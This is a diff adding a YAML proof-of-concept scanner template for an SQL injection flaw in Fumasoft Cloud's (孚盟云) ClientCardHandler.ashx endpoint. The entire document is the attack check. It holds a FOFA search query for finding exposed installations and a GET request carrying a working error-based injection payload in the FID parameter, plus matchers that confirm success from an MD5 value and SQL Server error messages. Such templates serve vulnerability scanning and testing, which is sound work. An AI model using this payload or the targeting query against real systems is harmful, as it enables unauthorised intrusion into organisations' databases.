@@ -1,0 +1,17 @@
+id: poc-yaml-fumasoft-clientcardhandler-ashx-sqli
+info:
+  name: 孚盟云 ClientCardHandler.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=1'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
+  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"\"Message\":")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
